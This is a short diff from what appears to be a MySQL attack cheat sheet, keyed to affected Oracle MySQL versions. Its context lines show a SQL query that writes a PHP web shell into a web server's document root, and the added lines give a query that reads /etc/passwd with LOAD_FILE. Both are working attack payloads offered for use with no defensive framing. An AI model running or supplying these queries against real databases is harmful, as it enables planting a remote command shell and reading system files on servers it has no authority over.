@@ -23,3 +23,7 @@ Oracle MySQL 5.1.x before 5.1.63, 5.5.x before 5.5.24, and 5.6.x before 5.6.6, a
 ```
 SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
 ```
+### read local file
+```
+select LOAD_FILE("/etc/passwd");
+```
